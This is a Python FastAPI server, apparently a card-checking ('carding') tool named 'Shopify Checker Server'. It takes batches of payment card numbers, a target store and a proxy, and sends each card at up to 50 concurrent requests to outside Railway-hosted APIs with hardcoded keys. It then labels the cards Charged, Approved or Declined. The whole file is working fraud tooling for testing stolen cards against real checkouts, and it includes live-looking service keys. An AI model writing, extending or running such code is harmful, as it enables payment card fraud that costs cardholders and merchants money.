from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import aiohttp
import asyncio
import os
import random
import time

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SHOPIFY_APIS = {
    "api1": {"url": "https://api-production-6b6d.up.railway.app/shopify", "key": "darkanon"},
    "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
}

@app.post("/check")
async def check_cards(data: dict):
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    
    # Results tracking
    results = []
    checked = 0
    charged = 0
    approved = 0
    dead = 0
    errors = []
    
    # Worker queue
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)
    
    semaphore = asyncio.Semaphore(concurrency)
    
    async def worker():
        nonlocal checked, charged, approved, dead
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while not queue.empty():
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                async with semaphore:
                    try:
                        url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
                        if proxy:
                            url += f"&proxy={proxy}"
                        
                        async with session.get(url) as resp:
                            text = await resp.text()
                            status = parse_status(text)
                            result = {
                                "card": card,
                                "status": status,
                                "message": text[:500],
                                "gateway": "Shopify",
                                "price": extract_price(text),
                                "api": api_name
                            }
                            results.append(result)
                            checked += 1
                            
                            if status == "Charged":
                                charged += 1
                            elif status == "Approved":
                                approved += 1
                            elif status == "Declined":
                                dead += 1
                    except Exception as e:
                        result = {
                            "card": card,
                            "status": "Error",
                            "message": str(e)[:200],
                            "gateway": "Shopify",
                            "price": "-",
                            "api": api_name
                        }
                        results.append(result)
                        errors.append(result)
                        checked += 1
                
                queue.task_done()
    
    # Run workers
    workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
    await asyncio.gather(*workers)
    
    return {
        "results": results,
        "total": len(results),
        "checked": checked,
        "charged": charged,
        "approved": approved,
        "dead": dead,
        "errors": len(errors),
        "concurrency_used": concurrency,
        "api_used": api_name
    }

@app.post("/check_stream")
async def check_stream(data: dict):
    """Stream results as they come in"""
    from fastapi.responses import StreamingResponse
    import json
    
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    
    async def generate():
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        
        semaphore = asyncio.Semaphore(concurrency)
        
        async def worker():
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                while not queue.empty():
                    try:
                        card = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                    
                    async with semaphore:
                        try:
                            url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
                            if proxy:
                                url += f"&proxy={proxy}"
                            
                            async with session.get(url) as resp:
                                text = await resp.text()
                                status = parse_status(text)
                                result = {
                                    "card": card,
                                    "status": status,
                                    "message": text[:500],
                                    "gateway": "Shopify",
                                    "price": extract_price(text)
                                }
                                yield json.dumps(result) + "\\n"
                        except Exception as e:
                            result = {
                                "card": card,
                                "status": "Error",
                                "message": str(e)[:200],
                                "gateway": "Shopify",
                                "price": "-"
                            }
                            yield json.dumps(result) + "\\n"
                    
                    queue.task_done()
        
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
        await asyncio.gather(*workers)
    
    return StreamingResponse(generate(), media_type="application/json")

def parse_status(text):
    t = text.lower()
    if any(key in t for key in ['no_product', 'no product', 'throttled', 'error', 'failed', 'timeout', 'blocked']):
        return "Declined"
    if "charged" in t or "order_placed" in t:
        return "Charged"
    elif "approved" in t:
        return "Approved"
    elif "declined" in t:
        return "Declined"
    return "Unknown"

def extract_price(text):
    import re
    prices = re.findall(r'\\$(\\d+\\.?\\d*)', text)
    return prices[0] if prices else "-"

@app.get("/health")
async def health():
    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}

@app.get("/")
async def root():
    return {
        "name": "Shopify Checker Server",
        "version": "2.0",
        "endpoints": {
            "POST /check": "Check cards with worker queue",
            "POST /check_stream": "Stream results as JSON lines",
            "GET /health": "Health check"
        }
    }

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
